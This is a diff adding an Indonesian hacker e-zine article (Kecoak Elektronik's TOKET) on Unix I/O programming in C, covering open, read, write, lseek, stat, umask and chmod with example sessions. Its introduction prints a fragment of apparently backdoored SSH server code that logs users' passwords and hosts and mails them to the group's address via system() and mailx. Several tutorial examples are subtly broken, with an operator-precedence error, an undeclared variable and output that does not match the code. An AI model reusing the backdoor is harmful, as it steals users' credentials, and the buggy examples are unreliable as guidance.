@@ -1,0 +1,1037 @@
+﻿Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Unix I/O programming
+Writer    : Electronic Zombie 0x0F Byteskrew
+Contact   : Do you want to talk with zombie?
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+--[2]-- Daftar Isi
+
+	1. Kecoak Elektronik License
+	2. Daftar Isi
+	3. Pendahuluan
+	4. Unix Basic
+		3.1 Unix Architecture
+		3.2 Unix Standard
+	5. I/O Programming
+		5.1 File I/O
+			5.1.1 Fungsi Open
+			5.1.2 Fungsi Create
+			5.1.3 Fungsi Close
+			5.1.4 Fungsi Lseek
+			5.1.5 Fungsi Read
+			5.1.6 Fungsi Write
+		5.2 Files and Directory
+			5.2.1 Pendahuluan
+			5.2.2 File Stat
+			5.2.3 Ownership of File and Directory
+				5.2.3.1 Fungsi Access
+				5.2.3.2 Fungsi Umask
+				5.2.3.3 Fungsi Chmod
+		5.3 Standard I/O Library
+			5.3.1 Pendahuluan
+			5.3.2 Standard Input, Output and Error
+	6. Penutup
+	7. Daftar Pustaka
+
+--[3]-- Pendahuluan
+	
+Pemahaman mendalam tentang sebuah sistem adalah sebuah keharusan bagi 
+mereka yang ingin menjadi seorang 'computer hacker'. Pemahaman tersebut 
+harusnya disertai dengan kemampuan programming yang cukup mumpuni, 
+minimal mampu membaca code dari sistem itu sendiri. Untuk mengetahui 
+lebih dalam dari sebuah sistem, tentunya kita harus mengetahui alur 
+dengan melihat source code dari sistem itu sendiri. Hal tersebutlah yang
+membuat open source operating system dipilih bagi meraka yang ingin 
+mendalami dan memahami alur kerja dari sebuah sistem, walaupun ada teknik 
+reserve engineering yang bisa membuat close source operating sistem 
+dipelajari.
+	
+___________________________________________________________________________
+	
+if((f=fopen(LOGZ,"a"))!=NULL){
+	   fprintf(f,"user:password@host --> %s:%s@%s\n",authctxt->server_user,
+	   password,authctxt->host);
+	   fclose(f);
+	}
+snprintf(logz,sizeof(logz),"tail -1 %s|mailx -s \"[owned user]new fucked user\" 
+hacker@kecoak-elektronik.net",LOGZ);
+system(logz); 
+___________________________________________________________________________
+		
+Potongan code dari salah satu staff Kecoak Elektronik diatas cukup memberi 
+gambaran bahwa proses I/O adalah salah satu dasar dari jurus 'kungfu hacking'. 
+Kalau anda merasa bahwa code diatas belum cukup jelas bagi anda, silahkan 
+teruskan membaca artikel ini. 
+		
+Dalam tulisan ini saya mencoba memberikan sedikit penjelasan dan pemahaman 
+disertai dengan beberapa contoh tentang proses input dan output dari 
+sistem unix. Proses input dan output dalam sebuah sistem adalah salah satu 
+yang sangat mendasar, karena filosofi dasar dari sistem informasi itu 
+sendiri adalah:
+		
+	Input ---> Prosess ---> Output [Informasi]
+		
+Dalam tulisan ini pula saya mencoba menerapkan dan menjelaskan dengan 
+metode 	"Learning by doing". Saya menganggap bahwa pembaca sudah 
+mengerti bahasa pemrograman C dengan baik dan mengerti sedikit banyak 
+tentang syscall unix/linux.
+	
+--[4]-- Unix Basic
+	
+--4.1-- Unix Architecture
+	
+Berbicara masalah sistem operasi unix dan turunannya, tidak akan pernah 
+terlepas dari bahasan mengenai arsitektur dari sistem operasi itu sendiri. 
+Ini dikarenakan	ketika ingin mendalaminya kita akan dihadapkan pada 
+berbagai kesulitan jika kita tidak memahami benar tentang arsitektur ini.
+		
+		--------------------------
+		Applications
+		--------------------------
+		Shell | Library Routines
+		--------------------------
+		System Calls
+		--------------------------
+		Kernel
+		--------------------------
+		Hardware
+		--------------------------
+		
+Secara garis besar, arsitektur sebuah sistem operasi unix bisa dijelaskan 
+oleh diagram diatas. Semua layer diatas mempunyai fungsi yang tidak 
+terpisahkan satu sama lain, ini	dikarenakan ada saling ketergantungan 
+oleh satu layer terhadap layer yang lainnya. ketika sebuah aplikasi 
+dijalankan atau di-compile pada sistem unix, otomatis aplikasi tersebut 
+membutuhkan Shell dan atau beberapa library (bahkan system call) untuk 
+menjalankannya, shell dan atau library tersebut jelas membutuhkan sistem 
+calls atau lebih dikenal sebagai syscall. Kernel adalah interface dari 
+sebuah sistem operasi untuk mengakses hardware yang ada pada sebuah komputer.
+		
+--4.2-- Unix Standard
+	
+Pada saat POSIX pertama kali diperkenalkan kepada publik, sekitar akhir 
+1980, terdapat beberapa model sistem unix, antara lain 4.3BSD dan sistem 
+V. Pada saat itu setiap model sistem operasi memiliki standard dan library 
+tersendiri yang hanya didukung oleh sistem itu sendiri, hal ini tentu 
+membuat para developer dan end user tidak bisa menggunakan dan atau 
+menjalankan aplikasi tertentu pada beberapa sistem operasi karena perbedaan 
+model itu tadi.
+	
+Hal diatas membuat IEEE, sebuah badan kerja untuk permasalah internet 
+menentukan sebuah standar sebuah sistem unix. POSIX 1003.1 adalah 
+standar pada saat itu yang menjelaskan tentang sekumpulan library yang 
+harus didukung oleh setiap versi dari sistem operasi yang berbasis unix.
+Standar ini sangat berguna untuk mendukung kompabilitas antarsistem, 
+sehingga setiap penulisan program, bisa dipastikan akan berjalan baik 
+disetiap sistem operasi unix apapun.
+
+Hal-hal apa saja yang harus menjadi standard sebuah sistem operasi berbasis
+unix? Well, beberapa diantaranya adalah standarisasi internet protocol, 
+basic tools, C language, dan syscall. Saat sekarang, hampir semua sistem 
+unix maupun unix like mendukung standar POSIX. Anda sangat disarankan 
+untuk berkunjung ke situs opengroup.org untuk mengetahui lebih lanjut 
+mengenai semua standarisasi yang diterapkan oleh sistem unix.
+		
+--[5]-- Input/Output Programming
+	
+Proses input/output dalam sebuah sistem operasi adalah sesuatu hal yang 
+sangat mendasar dalam pengoperasian sistem operasi tersebut. Dalam libc 
+di unix terdapat beberapa fungsi dan atau syscall untuk melakukan proses
+input/output seperti: open, read, write, lseek dan close. 
+	
+Sebelum lebih jauh mengenal fungsi dasar dari I/O yang terdapat pada 
+libc maupun syscall, ada satu hal penting yang harus anda ketahui tentang 
+unix. Dalam unix, segala entitas-nya dikenal sebagai file. Teks, binary 
+maupun perangkat dalam komputer, seperti hardisk, ethernet, bahkan 
+perangkat I/O seperti Serial Port, Paralel Port, USB, selalu didefinisikan 
+sebagai file dalam sistem file Unix. Untuk memproses file-file tersebut, 
+diperlukan sebuah descriptor yang mengembalikan sebuah nilai integer.
+Nilai kembalian dari file descriptor tersebutlah yang akan menentukan 
+proses pengolahan file itu sendiri.
+
+--5.1-- File I/O
+	
+Pengolahan file dalam sebuah sistem tentu adalah salah satu dari bagian 
+inti dalam prosess kerja sebuah aplikasi, bahkan sistem operasi sekalipun. 
+Apalagi dalam dunia unix, yang mengenal seluruh entitas-nya sebagai file. 
+	
+Berikut ini adalah sedikit penjelasan mengenai fungsi(API) dasar dari File
+I/O. Saya akan mencoba menjelaskan dengan bentuk code dan sedikit penjelasan 
+mengenai penggunaan fungsi-fungsi tersebut, tentunya agar mudah bagi anda 
+untuk memahaminya.
+oke, let start...
+	
+--5.1.1-- Fungsi Open
+
+Ketika fungsi open() dipaanggil, akan terjadi komunikasi antara file yang
+akan dibuka dengan file descriptor dari file itu sendiri. Prosess komunikasi 
+itu sendiri berguna untuk menentukan nilai kembalian dari file descriptor 
+itu sendiri. Selanjutnya fungsi open() juga akan melihat parameter berikutnya 
+yaitu file flag, yang akan menentukan mode pembukaan dari file tersebut. 
+Berikut adalah bentuk dari fungsi open():
+
+		-------------------------------------------------------------------
+		#include <fcntl.h>
+
+		int open (__const char *__file, int __oflag, ...) __nonnull ((1));
+		-------------------------------------------------------------------
+		Note:
+		fungsi open dideklarasikan di file header fcntl.h (File Control Operations).
+			
+-*__file ini variable pointer yang menunjuk path dari file yang akan di buka
+-__flag adalah variable yang menentukan mode pembukaan file.
+			
+beberapa mode pembukaan file untuk fungsi open() adalah:
+			
+	- O_RDONLY --> Open for reading only.
+	- O_WRONLY --> Open for writing only.
+	- O_RDWR   --> Open for reading and writing.
+			
+Example code:
+
+	K-Elektronik jackD # cat open.c
+
+	//--------------code start-------------------
+	#include <stdio.h>
+	#include <fcntl.h>
+
+	int main(int argc, char *argv[]){
+	int fd;//file descriptors
+
+		if ( fd = open(argv[1], O_RDONLY) < 0){ 
+				printf("File cannot open\n");		
+			}										
+		else {
+				printf("File opened-->%s\n",argv[1]);
+			}
+		return 0;
+	}
+	//-----------EOF-----------------------------
+			
+Code diatas menggunakan 2 header file, yaitu stdio.h untuk menggunakan 
+fungsi seperti printf() dan fcntl.h untuk menggunkan fungsi open(). 
+Variable fd yang bertipe integer diatas digunakan sebagai descriptor, 
+dimana ketika fungsi open () dipakai dengan parameter masukan argv[1] yang 
+merupakan pointer yang menunjuk ke variable yang bertipe char dan flag 
+file yang bertipe integer. Ketika nilai dari fd < 0, maka file tersebut 
+dianggap tidak ada atau tidak bisa dibuka.
+
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc open.c
+K-Elektronik jackD # ls
+a.out*  open.c  
+K-Elektronik jackD # ./a.out kidd0
+File cannot open
+K-Elektronik jackD # ./a.out open.c
+File opened-->open.c
+K-Elektronik jackD #
+---------------------------------------------
+
+--5.1.2-- Fungsi Creat
+
+Fungsi creat() dalam standard ISO C, kurang lebih sama dengan fungsi open(). 
+fungsinya untuk membuat file atau me-rewrite yang ada. fungsinya seperti 
+berikut:
+
+		-------------------------------------------------------------------
+		#include <fcntl.h>
+
+		int creat (__const char *__file, __mode_t __mode) __nonnull ((1));
+		-------------------------------------------------------------------
+		Note:
+		fungsi create dideklarasikan di file header fcntl.h (File Control Operations).
+			
+-*__file ini variable yang menunjuk path dari file yang akan di buat
+-__mode adalah variable yang menentukan mode pembuatan file.
+			
+Example code:
+K-Elektronik jackD # cat creat.c
+	//--------------code start-------------------
+	#include <stdio.h>
+	#include <fcntl.h>
+	#include <sys/stat.h>
+
+	int main(int argc, char *argv[]){
+			int fd;
+
+			if (fd =creat(argv[1], S_IRGRP) < 0){
+					printf("Cannot creat file\n");
+				}
+			else {
+					printf("%s-->Created\n",argv[1]);
+				}
+	return 0;
+	}
+	//-----------EOF-----------------------------
+			
+Sama seperti code penggunaan fungsi open(), penggunaan fungsi creat() 
+pun menggunakan header fcntl.h. Disini saya menambahkan file header 
+sys/stat.h untuk penggunaan variable S_IRGRP, dimana file akan dibuat 
+dengan mode pembacaan untuk group.
+			
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc creat.c
+K-Elektronik jackD # ./a.out
+Cannot creat file
+K-Elektronik jackD # ./a.out kecoak-elektronik
+kecoak-elektronik-->Created
+K-Elektronik jackD # ls -l kecoak-elektronik
+----r----- 1 root root 0 Mar 28 04:40 kecoak-elektronik
+K-Elektronik jackD #
+---------------------------------------------
+			
+--5.1.3-- Fungsi Close
+
+Fungsi close() melakukan deallocation terhadap file desciptors, agar 
+file descriptor tersebut bisa digunakan oleh fungsi yang lainnya. Berikut 
+ini bentuk fungsi dari close():
+
+		-------------------------------------------------------------------
+		#include <unistd.h>
+		int close (int __fd);
+		-------------------------------------------------------------------
+		Note:
+		fungsi close dideklarasikan di file header unistd.h (Symbolic Constants).
+			
+-__fd adalah variable untuk file descriptor.
+			
+Example code:
+K-Elektronik jackD # cat close.c
+//--------------code start-------------------
+	#include <stdio.h>
+	#include <fcntl.h>
+	#include <unistd.h>
+
+	int main(int argc, char *argv[]){
+		int fd;
+		fd = open(argv[1], O_WRONLY);
+
+			if ( close(fd) < 0){
+					printf("FIle can't close, Not found or can't open with write options \n");
+				}
+			else {	
+					printf("File %s Opened and Closed successfully\n",argv[1]);
+				}
+
+		return 0;
+		}
+//-----------EOF-----------------------------
+		
+Script close.c diatas menggunakan tiga file header, stdio.h untuk 
+penggunaan fungsi printf(), fcntl.h untuk penggunaan fungsi open(). 
+Kenapa menggunakan fungsi open()? karena tidak mungkin menutup sebuah 
+file apabila belum membukanya. fungsi open() diatas di sertai dengan 
+flag write (O_WRONLY), jadi selama file tersebut ber-atribut write 
+artinya bisa dibuka, sebaliknya apabila file tersebut tidak memiliki 
+atribut write, tentunya tidak bisa dibuka. Ketika file berhasil dibuka, 
+file tersebut akan ditutup dengan fungsi close(), jika nilai kembalian 
+fungsi tersebut < 0, maka file tersebut tidak bisa ditutup.
+			
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc close.c
+K-Elektronik jackD # ls
+a.out*  close.c
+K-Elektronik jackD # ./a.out /etc/motd
+File /etc/motd Opened and Closed successfully
+K-Elektronik jackD # ./a.out close.c
+File close.c Opened and Closed successfully
+K-Elektronik jackD # ./a.out /bin/sh
+FIle can't close, Not found or can't open with write options
+K-Elektronik jackD # ./a.out /dev/kmem
+File /dev/kmem Opened and Closed successfully
+K-Elektronik jackD # ./a.out /dev/tty
+File /dev/tty Opened and Closed successfully
+K-Elektronik jackD # ./a.out a.out
+FIle can't close, Not found or can't open with write options
+---------------------------------------------
+			
+--5.1.4-- Fungsi lseek
+
+Fungsi lseek() pada dasarnya menentukan posisi pembacaan dan atau penulisan 
+terhadap sebuah file. 
+
+		-------------------------------------------------------------------
+		#include <unistd.h>
+		__off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+		-------------------------------------------------------------------
+		Note:
+		fungsi lseek dideklarasikan di file header unistd.h (Symbolic Constants).
+			
+-__fd adalah variable untuk file descriptor.
+-__offset adalah variable untuk membaca offset dari sebuah file
+-__whence adalah variable yang merupakan parameter dari __offset, yang
+menunjukan dari mana pembacaan file dilakukan. 
+terdiri dari 3 mode:
+	- SEEK_SET 
+	- SEEK_CUR 
+	- SEEK_END
+			
+Example code:
+K-Elektronik jackD # cat lseek.c
+//--------------code start-------------------
+	#include <stdio.h>
+	#include <unistd.h>
+	#include <stdlib.h>
+
+	int main(void){
+		if (lseek(STDIN_FILENO, 0, SEEK_CUR) ==-1)
+				printf("cannot seek\n");
+		else
+				printf("seek OK\n");
+		exit(0);
+			}
+//-----------EOF-----------------------------
+
+PoC:
+---------------------------------------------
+K-Elektronik jackD # gcc -o lseek lseek.c
+K-Elektronik jackD # ./lseek < /etc/motd
+seek OK
+K-Elektronik jackD # ./lseek < /dev/kmem
+seek OK
+K-Elektronik jackD # ./lseek < /dev/tty
+can't seek
+K-Elektronik jackD #
+---------------------------------------------
+			
+Untuk lebih memahami fungsi lseek(), mari kita lihat contoh lainnya:
+			
+K-Elektronik jackD # cat seek.c
+//--------------code start-------------------
+	#include <stdio.h>
+	#include <unistd.h>
+	#include <stdlib.h>
+
+	int main(int argc, char *argv[]){
+		off_t currpos,setpos,endpos;
+
+		currpos = lseek(STDIN_FILENO, 0, SEEK_CUR);
+		printf("Current seek is:%d\n",currpos);
+
+		setpos = lseek(STDIN_FILENO, 10, SEEK_SET);
+		printf("Set seek to :%d\n",setpos);
+
+		endposs = lseek(STDIN_FILENO, 0, SEEK_END);
+		printf("End seek is:%d\n",endpos);
+
+		exit(0);
+	}
+//-----------EOF-----------------------------
+
+PoC:
+---------------------------------------------
+K-Elektronik jackD # gcc -o seek seek.c
+K-Elektronik jackD # ./seek < /etc/motd
+Current seek is:0
+Set seek to :10
+End seek is:16
+K-Elektronik jackD # ./seek < /dev/kmem
+Current seek is:0
+Set seek to :10
+End seek is:-1
+K-Elektronik jackD # ./seek < /dev/tty
+Current seek is:-1
+Set seek to :-1
+End seek is:-1
+K-Elektronik jackD # wc -c /bin/bash
+678832 /bin/bash
+K-Elektronik jackD # ./a.out < /bin/bash
+Current seek is:0
+Set seek to :10
+End seek is:678832
+K-Elektronik jackD #
+---------------------------------------------
+			
+Dari kedua contoh script diatas, dapat kita simpulkan bahwa fungsi
+lseek() bisa melihat atau membaca block file mulai dari awal dengan 
+variable SEEK_CUR, akhir dengan variable SEEK_END atau ditentukan 
+oleh user dengan variable SEEK_SET. 
+
+--5.1.5-- Fungsi Read
+
+Fungsi read() akan membaca sebuah file dari nbytes (byte yang akan ditentukan),
+bentuk fungsi tersebut seperti berikut:
+
+		--------------------------------------------------------------------
+		#include <unistd.h>
+		ssize_t read (int __fd, void *__buf, size_t __nbytes) __wur;
+		--------------------------------------------------------------------
+		Note:
+		fungsi read dideklarasikan di file header unistd.h (Symbolic Constants).
+			
+-__fd adalah variable untuk file descriptor.
+-*__buf pointer untuk buffer file
+-__nbytes ukuran dalam n bytes
+			
+Example code:
+K-Elektronik jackD # cat read.c
+//--------------code start-------------------
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <fcntl.h>
+
+	int main(int argc, char *argv[]){
+			int fd;
+			fd = open(argv[1],O_RDONLY);
+
+			if (read(fd, 0, 0) < 0)
+					printf("File %s can't read\n",argv[1]);
+			else
+					printf("File %s can read\n",argv[1]);
+			return 0;
+			}
+//-----------EOF-----------------------------
+			
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc read.c
+K-Elektronik jackD # ls -l
+total 12
+-rwxr-xr-x 1 root root 6623 Apr  4 10:12 a.out*
+-rw------- 1 root root  260 Apr  4 10:12 read.c
+K-Elektronik jackD # ./a.out read.c
+File read.c can read
+K-Elektronik jackD # su jackd
+K-Elektronik jackD $ id
+uid=1002(jackd) gid=100(users) groups=100(users)
+K-Elektronik jackD $ ./a.out read.c
+File read.c can't read
+---------------------------------------------
+			
+Script read.c menggunakan 3 file header, header fcntl.h untuk menggunakan
+fungsi open(), kemudian unistd.h untuk menggunakan fungsi read(). Script
+diatas juga membuka file dengan mode read only. 
+			
+--5.1.6-- Fungsi Write
+
+Hampir sama dengan fungsi open(), fungsi write() juga akan menulisi
+sebuah file pada nbyter yang ditentukan dalam parameter fungsi write()
+itu sendiri. Bentuknya seperti berikut:
+
+		--------------------------------------------------------------------
+		#include <unistd.h>
+		 ssize_t write (int __fd, __const void *__buf, size_t __n) __wur;
+		--------------------------------------------------------------------
+		Note:
+		fungsi write dideklarasikan di file header unistd.h (Symbolic Constants).
+			
+-__fd adalah variable untuk file descriptor.
+-*__buf pointer untuk buffer file
+-__n ukuran dalam n bytes
+			
+Example code:
+K-Elektronik jackD # cat write.c
+//--------------code start-------------------
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <fcntl.h>
+
+		int main(int argc, char *argv[]){
+			int fd;
+			fd = open(argv[1],O_WRONLY);
+
+			if ( write( fd, 0, 0 ) < 0)
+					printf ("file can't write\n");
+			else
+					printf ("file can write-->%s\n",argv[1]);
+			return 0;
+		}
+//-----------EOF-----------------------------
+			
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc write.c
+K-Elektronik jackD # ./a.out /bin/sh
+file can't write
+K-Elektronik jackD # ./a.out /etc/motd
+file can write-->/etc/motd
+K-Elektronik jackD #
+---------------------------------------------
+			
+Tidak jauh berbeda dengan script read.c sebelumnya, script ini juga
+menggunakan fungsi open() terlebih dahulu sebelum mengecek apakah file
+yang akan dibuka bisa ditulisi atau tidak.
+		
+--5.2--	Files and Directory
+		
+--5.2.1-- Pendahuluan
+			
+Dalam proses pengelolaan file di unix sistem ( unix mengenal semua 
+device dalam sistemnya sebagai file) kita harus bisa membedakan tipe 
+dari file tersebut. Hal ini berguna untuk proses pengolahan file 
+tersebut. Dalam unix terdapat beberapa jenis file antara lain:
+	1. Regular file
+		Regular file adalah file yang bertipe binary dan teks.
+	2. Directory file
+		Adalah file yang bertipe directory. File ini dalam unix berfungsi 
+		menampung file-file yang lain.
+	3. Block special file
+		File ini adalah file special yang dibuat untuk model device yang 
+		terdiri atas alamat block random seperti disk device.
+	4. Character special file
+		Character file digunakan untuk device yang bersifat lebih statis, 
+		seperti network interface atau terminal.
+	5. FIFO file
+		Adalah file komunikasi antara prosess.
+	6. Socket file
+		Adalah file komunikasi dalan networking.
+	7. Symbolic link file
+		Adalah file yang menunjuk file yang lain.
+				
+--5.2.2-- File Stat
+			
+Fungsi pembacaan stat dalam unix itu berada pada header sys/stat.h 
+dalam GNU libc. Sedangkan structur data-nya terlihat seperti berikut:
+	 struct stat {
+		mode_t    st_mode;      /* file type & mode (permissions) */
+		ino_t     st_ino;       /* i-node number (serial number) */
+		dev_t     st_dev;       /* device number (file system) */
+		dev_t     st_rdev;      /* device number for special files */
+		nlink_t   st_nlink;     /* number of links */
+		uid_t     st_uid;       /* user ID of owner */
+		gid_t     st_gid;       /* group ID of owner */
+		off_t     st_size;      /* size in bytes, for regular files */
+		time_t    st_atime;     /* time of last access */
+		time_t    st_mtime;     /* time of last modification */
+		time_t    st_ctime;     /* time of last file status change */
+		blksize_t st_blksize;   /* best I/O block size */
+		blkcnt_t  st_blocks;    /* number of disk blocks allocated */
+		};
+
+Dalam header sys/stat.h sendiri terdapat fungsi yang bisa membedakan 
+jenis dan tipe file itu sendiri:
+				
+	S_ISREG() 	-> regular file
+	S_ISDIR() 	-> directory file
+	S_ISCHR() 	-> character special file
+	S_ISBLK() 	-> block special file
+	S_ISFIFO() 	-> pipe or FIFO
+	S_ISLNK() 	-> symbolic link
+	S_ISSOCK() 	-> socket
+			
+Example code:
+K-Elektronik jackD # cat stat.c
+//--------------code start-------------------
+	#include <stdio.h>
+	#include <sys/stat.h>
+	#include <stdlib.h>
+
+	int main (int argc, char *argv[]){
+		int i;
+		struct stat buf;
+		char *ptr;
+
+		if ( argc < 2){
+				printf ("use %s file\n",argv[0]);
+			}
+
+		for ( i = 1; i < argc ; i++){
+			printf("File %s is-->",argv[i]);
+				if (lstat(argv[i], &buf) < 0){
+						printf("lstat error\n");
+						continue;
+					}
+				if (S_ISREG(buf.st_mode))
+						ptr = "regular";
+				else if (S_ISDIR(buf.st_mode))
+						ptr = "directory";
+				else if (S_ISCHR(buf.st_mode))
+						ptr = "character special";
+				else if (S_ISBLK(buf.st_mode))
+						ptr = "block special";
+				else if (S_ISFIFO(buf.st_mode))
+						ptr = "fifo";
+				else if (S_ISLNK(buf.st_mode))
+						ptr = "symbolic link";
+				else if (S_ISSOCK(buf.st_mode))
+						ptr = "socket";
+				else
+						ptr = "unknow file";
+				printf("%s file\n",ptr);
+			}
+		exit(0);
+		}
+//-----------EOF-----------------------------
+
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc stat.c
+K-Elektronik jackD # ls
+a.out*  stat.c
+K-Elektronik jackD # ./a.out
+use ./a.out file
+K-Elektronik jackD # ./a.out stat.c
+File stat.c is-->regular file
+K-Elektronik jackD # file stat.c
+stat.c: ASCII C program text
+K-Elektronik jackD # ./a.out /dev/hda1 /dev/tty /bin/sh /etc
+File /dev/hda1 is-->block special file
+File /dev/tty is-->character special file
+File /bin/sh is-->symbolic link file
+File /etc is-->directory file
+K-Elektronik jackD # file  /dev/hda1 /dev/tty /bin/sh /etc
+/dev/hda1: block special (3/1)
+/dev/tty:  character special (5/0)
+/bin/sh:   symbolic link to `bash'
+/etc: 	   directory
+K-Elektronik jackD # man file
+---snip---
+NAME
+file -- determine file type
+---snip---
+---------------------------------------------
+
+Note:
+program hasil compilasi dari stat.c diatas adalah program yang hampir 
+mirip dengan program file yang sudah jadi standard unix. keduanya akan 
+menentukan jenis atau tipe dari file yang akan dibaca.
+		
+--5.2.3-- Ownership of File and Directory
+		
+Ketika sebelumnya kita membicarakan jenis dari setiap file, apakah file
+tersebut adalah sebuah file teks, binary atau merupakan sebuah file device
+khusus, maka sekarang waktunya kita membahas tingkat access dari setiap
+file. Ketika sebuah file dibuka oleh fungsi creat atau fungsi open, kita 
+bisa menentukan sejauh mana tingkat access dari file tersebut. Dalam perintah
+dasar dari unix, untuk melihat tingkat access tersebut kita bisa menggunakan
+perintah "ls -l", atau ketika kita ingin merubah tingkat access kita bisa 
+menggunakan beberapa perintah seperti chown, chmod atau chattr (chflag untuk
+sistem *BSD). 
+
+Berikut ini beberapa fungsi dasar dalam unix programming library untuk me-
+nentukan tingkat access dari sebuah file.
+			
+--5.2.3.1-- Fungsi Access
+				
+fungsi access() sendiri adalah fungsi yang terdeklarasi di dalam header
+unistd.h yang akan melakukan access pada sebuah file dengan mode yang akan 
+ditentukan pada fungsi itu sendiri. Bentuknya seperti berikut:
+	
+	------------------------------------------------------------------------
+	int access(const char *pathname, int mode);
+	------------------------------------------------------------------------
+	
+Dimana variable mode adalah nilai constan dari header unistd.h itu sendiri
+yang terdiri dari:
+		R_OK --> test for read permission
+		W_OK --> test for write permission
+		X_OK --> test for execute permission
+		F_OK --> test for existence of file
+				
+Example code:
+K-Elektronik jackD # cat access.c
+//--------------code start-------------------
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+
+	int main(int argc, char *argv[]){
+
+		if (access(argv[1], R_OK) < 0)
+				printf("access error\n");
+		else
+				printf("read access OK\n");
+
+		exit(0);
+	}
+//-----------EOF-----------------------------
+				
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc access.c
+K-Elektronik jackD # ls -l /etc/shadow
+-rw-r----- 1 root root 657 Mar 27 12:36 /etc/shadow
+K-Elektronik jackD # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+K-Elektronik jackD # ./a.out /etc/shadow
+read access OK
+K-Elektronik jackD # su jackd
+K-Elektronik jackD $ ./a.out /etc/shadow
+access error
+K-Elektronik jackD $ id
+uid=1002(jackd) gid=100(users) groups=100(users)
+			
+--5.2.3.2-- Fungsi Umask
+				
+Fungsi Umask berguna untuk menentukan tingkat processing dari file yang
+akan dibuka atau dibuat. Fungsi ini ada di file header sys/stat.h dan
+memiliki parameter seperti berikut:
+				
+	------------------------------------------------------------------------
+	mode_t umask(mode_t cmask);
+	------------------------------------------------------------------------
+				
+Seperti terlihat diatas fungsi ini bertipe mode_t (tipe data bentukan dalam
+unix/linux). Sedangkan parameter dari fungsi umask itu sendiri adalah:
+				
+		S_ISUID --> set-user-ID on execution
+		S_ISGID --> set-group-ID on execution
+		S_ISVTX --> saved-text (sticky bit)
+		S_IRWXU --> read, write, and execute by user (owner)
+			S_IRUSR --> read by user (owner)
+			S_IWUSR --> write by user (owner)
+			S_IXUSR --> execute by user (owner)
+		S_IRWXG --> read, write, and execute by group
+			S_IRGRP --> read by group
+			S_IWGRP --> write by group
+			S_IXGRP --> execute by group
+		S_IRWXO --> read, write, and execute by other (world)
+			S_IROTH --> read by other (world)
+			S_IWOTH --> write by other (world)
+			S_IXOTH --> execute by other (world)
+				
+Example code:
+K-Elektronik jackD # cat umask.c
+//--------------code start-------------------
+	#include <sys/stat.h>
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <fcntl.h>
+
+	#define RWRWRW (S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH)
+
+	int main(int argc, char *argv[]){
+
+			umask(S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
+
+			if (creat(argv[1], RWRWRW)  < 0)
+						printf("create error for %s\n",argv[1]);
+			else
+						printf("set umask for %s OK\n",argv[1]);
+			exit(0);
+	}
+//-----------EOF-----------------------------
+
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc umask.c
+K-Elektronik jackD # ./a.out kecoak-elektronik
+set umask for kecoak-elektronik OK
+K-Elektronik jackD # ls -l kecoak-elektronik
+-rw------- 1 root root 0 Apr  9 18:37 kecoak-elektronik
+
+			
+--5.2.3.3-- Fungsi Chmod
+				
+Fungsi chmod yang terdeklarasi pada header sys/stat.h dengan parameter:
+				
+		------------------------------------------------------------------------
+		int chmod(const char *pathname, mode_t mode);
+		------------------------------------------------------------------------
+				
+Adalah sebuah fungsi yang berguna untuk mengubah 'perijinan' dari sebuah
+file. Fungsi ini di dunia unix yang diwakili oleh perintah dasar chmod yang 
+sangat berguna untuk persoalan keamanan sekaligus kelemahan apabila salah
+dalam implementasinya.
+				
+Parameter dari fungsi ini sama seperti fungsi umask() sebelumnya.
+Example code:
+				
+K-Elektronik jackD # cat chmod.c
+//--------------code start-------------------
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <sys/stat.h>
+
+	int main(int argc, char * argv[]){
+
+	//set chmod to [ rw-r--r-- ]
+
+		if(chmod(argv[1], S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH) < 0)
+				printf("chmod error for %s\n",argv[1]);
+		else
+				printf("chmod success for %s\n",argv[1]);
+		exit(0);
+	}
+//-----------EOF-----------------------------
+				
+PoC::
+---------------------------------------------
+K-Elektronik jackD # gcc chmod.c
+K-Elektronik jackD # touch kecoak
+K-Elektronik jackD # chmod 0000 kecoak
+K-Elektronik jackD # ls -l kecoak
+---------- 1 root root 0 Apr 14 21:03 kecoak
+K-Elektronik jackD # ./a.out kecoak
+chmod success for kecoak
+K-Elektronik jackD # ls -l kecoak
+-rw-r--r-- 1 root root 0 Apr 14 21:03 kecoak
+K-Elektronik jackD #
+
+--5.3-- I/O Standard Library
+	
